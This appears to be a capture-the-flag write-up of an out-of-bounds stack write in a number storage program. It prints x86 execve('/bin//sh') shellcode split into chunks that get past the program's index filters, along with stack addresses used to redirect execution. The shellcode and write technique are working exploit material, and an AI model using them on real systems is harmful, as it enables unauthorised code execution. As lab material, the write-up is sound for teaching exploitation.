The program is a number storage service. We can store numbers, read the stored numbers, or quit. Looking at the [source code](../source.c) in more detail, we notice that there is no check of the index where we save our numbers in the store_number() function. Therefore, we can write almost anywhere we want on the stack. We'll be able to exploit that, but we'll have to deal with some limitations: 

* First of all, concerning the registration of numbers in the dataset:
** numbers are stored at index * 4
** index % 3 must not be equal to 0
** number >> 24 must not be equal to 183 

* The program has been compiled with the flag "-fstack-protector" which protects the return address of the program's main() function.

* At the beginning of the program, `av` and `env` are cleared and therefore cannot be used to store shellcode in memory. 




Let's start by finding the buffer address in the store_number() function:

esp: 0xffffd520
buf dans main: 0x24(%esp) <=> 0xffffd544

"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"



index N     : "\x31\xc9\xf7\xe1"
index N+1   : "\xb0\x0b" + jump
index N+3   : "\x51\x68\x2f\x2f"
index N+4   : "\x73\x68" + jump
index N+6   : "\x68\x2f\x62\x69"
index N+7   : "\x6e\x89" + jump
index N+9   : "\xe3\xcd\x80"



buf:                    0xffffd544

eip in read_number():   0x8048930




We can now reach the next level with the command `su level08` and fill in the flag found as a password.